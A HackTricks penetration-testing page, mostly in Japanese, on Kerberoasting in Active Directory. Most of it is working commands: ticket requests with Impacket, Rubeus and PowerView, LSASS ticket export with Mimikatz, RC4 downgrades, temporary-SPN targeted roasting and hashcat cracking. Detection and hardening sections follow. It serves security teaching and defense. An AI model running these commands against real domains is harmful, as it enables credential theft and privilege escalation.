# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting は、Active Directory (AD) でユーザーアカウント（コンピューターアカウントを除く）の権限で動作するサービスに関連する TGS チケットの取得に焦点を当てます。これらのチケットの暗号化にはユーザーパスワードを元にしたキーが使用されるため、オフラインで credential cracking が可能です。サービスでユーザーアカウントが使用されていることは、空ではない ServicePrincipalName (SPN) プロパティによって示されます。

認証済みのドメインユーザーであれば誰でも TGS チケットを要求できるため、特別な権限は必要ありません。<sup>[[4]](#references)[[5]](#references)</sup>

### Key Points

- ユーザーアカウントで実行されるサービス（SPN が設定されたアカウント。コンピューターアカウントではない）の TGS チケットをターゲットにする。
- チケットはサービスアカウントのパスワードから派生したキーで暗号化され、オフラインで crack できる。
- 昇格された権限は不要。認証済みアカウントであれば誰でも TGS チケットを要求できる。

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> また、「spray-and-pray」roasting は避けてください。Rubeus のデフォルトの kerberoast は、すべての SPN を query してチケットを要求できるため、noisy です。まず興味深い principal を enumerate してからターゲットにしてください。

### Service account secrets & Kerberos crypto cost

多くのサービスは現在も、手動で管理されたパスワードを持つユーザーアカウントで実行されています。KDC はそれらのパスワードから派生したキーで service ticket を暗号化し、その ciphertext を認証済みの principal に渡します。そのため kerberoasting では、lockout や DC telemetry の影響を受けず、無制限のオフライン推測が可能です。暗号化モードによって cracking budget が決まります。

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt によって rainbow table は防がれますが、短いパスワードに対する高速な cracking は依然として可能です。 |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES より約 1000 倍高速です。攻撃者は `msDS-SupportedEncryptionTypes` が許可している場合、常に RC4 を強制します。 |

*Benchmarks from Chick3nman as cited in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

RC4 の confounder は keystream をランダム化するだけで、1 回の推測ごとの処理量を増やすものではありません。service account がランダムな secret（gMSA/dMSA、machine account、または vault で管理された文字列）に依存していない限り、侵害速度は純粋に GPU budget によって決まります。AES-only の etype を強制すると、1 秒あたり数十億回の推測が可能になる downgrade は排除できますが、弱い人間が設定したパスワードは依然として PBKDF2 によって crack されます。<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExec を使用して roastable なチケットを要求し、Hashcat で crack する実践的な end-to-end の例は、reference [1] にあります。<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Kerberoastチェックを含む複数機能のツール:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable usersを列挙する
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGSを要求してメモリからdumpする
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: 自動ツール
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS request generates Windows Security Event 4769 (A Kerberos service ticket was requested).

### OPSEC と AES-only 環境

- AES がないアカウントに対して、意図的に RC4 を要求する:
- Rubeus: `/rc4opsec` は tgtdeleg を使用して AES のないアカウントを列挙し、RC4 service ticket を要求する。
- Rubeus: kerberoast と `/tgtdeleg` を併用すると、可能な場合に RC4 request も発生する。<sup>[[6]](#references)</sup>
- AES-only アカウントを、黙って失敗させる代わりに Roast する:
- Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES service ticket（etype 17/18）を要求する。
- すでに TGT（PTT または .kirbi から）を保持している場合は、`/spn:<SPN>` または `/spns:<file>` と `/ticket:<blob|path>` を使用して LDAP をスキップできる。
- Targeting、throttling、noise の低減:
- `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>`、`/jitter:<1-100>` を使用する。
- `/pwdsetbefore:<MM-dd-yyyy>`（古い password）で弱い password の可能性が高い対象を filter するか、`/ou:<DN>` で privileged OU を対象にする。<sup>[[8]](#references)</sup>

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

アカウントを制御している、または変更できる場合、SPNを追加することでkerberoastableにできます:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
アカウントをダウングレードして RC4 を有効にし、cracking を容易にする（対象オブジェクトへの書き込み権限が必要）:
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll over a user を利用した Targeted Kerberoast（temporary SPN）

BloodHound でユーザーオブジェクトに対する制御権（例：GenericWrite/GenericAll）を持っていることが示された場合、そのユーザーに現在 SPN が設定されていなくても、対象ユーザーを確実に「targeted-roast」できます:<sup>[[9]](#references)</sup>

- 制御対象ユーザーに temporary SPN を追加し、roastable にする。
- その SPN に対して RC4（etype 23）で暗号化された TGS-REP を要求し、cracking に適した形式にする。
- `$krb5tgs$23$...` hash を hashcat で crack する。
- footprint を減らすため、SPN を削除して後処理する。

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner（targetedKerberoast.py は SPN の追加 -> TGS（etype 23）のリクエスト -> SPN の削除を自動化します）:<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat の autodetect で出力を crack します（`$krb5tgs$23$` に対する mode 13100）：
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
検出に関する注意: SPN の追加/削除によってディレクトリの変更が発生し（対象ユーザー上で Event ID 5136/4738）、TGS リクエストによって Event ID 4769 が生成されます。スロットリングとプロンプトのクリーンアップを検討してください。

Kerberoast attacks に役立つツールはこちらにあります: https://github.com/nidem/kerberoast

Linux で次のエラーが表示された場合: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` これはローカル時刻のずれが原因です。DC と同期してください:

- `ntpdate <DC_IP>`（一部のディストリビューションでは非推奨）
- `rdate -n <DC_IP>`

### ドメインアカウントなしの Kerberoast（AS-requested STs）

2022年9月、Charlie Clark は、principal に pre-authentication が必要ない場合、リクエスト本文の sname を変更して細工した KRB_AS_REQ により service ticket を取得できることを示しました。これにより、TGT の代わりに service ticket を実質的に取得できます。この手法は AS-REP roasting に類似しており、有効なドメイン認証情報を必要としません。

詳細については、Semperis の解説「New Attack Paths: AS-requested STs」を参照してください。<sup>[[10]](#references)</sup>

> [!WARNING]
> 有効な認証情報がない場合、この手法では LDAP にクエリできないため、ユーザーのリストを指定する必要があります。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
関連

AS-REP roastable usersを対象とする場合は、以下も参照してください。

{{#ref}}
asreproast.md
{{#endref}}

### 検知

Kerberoastingはステルス性を持たせることができます。DCからのEvent ID 4769をHuntし、ノイズを減らすために次のフィルターを適用します。

- service nameが`krbtgt`および`$`で終わるservice name（computer accounts）を除外する。
- machine accountsからのリクエスト（`*$$@*`）を除外する。
- 成功したリクエストのみ（Failure Code `0x0`）。
- encryption typesを追跡する：RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。`0x17`のみを対象にalertしない。

PowerShellによるtriageの例：
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
追加のアイデア:

- ホスト/ユーザーごとの通常の SPN 利用状況をベースライン化し、単一の principal から異なる SPN リクエストが大量に発生した場合に alert を出す。
- AES で hardening されたドメインで、通常とは異なる RC4 の利用を検出する。

### 軽減 / Hardening

- サービスには gMSA/dMSA または machine accounts を使用する。Managed accounts には 120 文字以上のランダムなパスワードが設定され、自動的にローテーションされるため、offline cracking は現実的ではない。<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` を AES-only（decimal 24 / hex 0x18）に設定して service accounts に AES を強制し、その後パスワードをローテーションして AES keys が派生するようにする。<sup>[[7]](#references)</sup>
- 可能な場合は環境内で RC4 を無効化し、RC4 の利用試行を monitor する。DC では、`msDS-SupportedEncryptionTypes` が設定されていない accounts のデフォルトを制御するために、`DefaultDomainSupportedEncTypes` registry value を使用できる。十分にテストすること。
- user accounts から不要な SPN を削除する。<sup>[[7]](#references)</sup>
- managed accounts を使用できない場合は、長くランダムな service account passwords（25 文字以上）を使用し、一般的なパスワードを禁止して定期的に audit する。<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking の実践](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Legacy Kerberos Crypto による低技術・高影響の攻撃 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos をどのように attack するか？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES が Enabled の場合に RC4 Encrypted TGS を Request する](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting の軽減に役立つ Microsoft の guidance](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
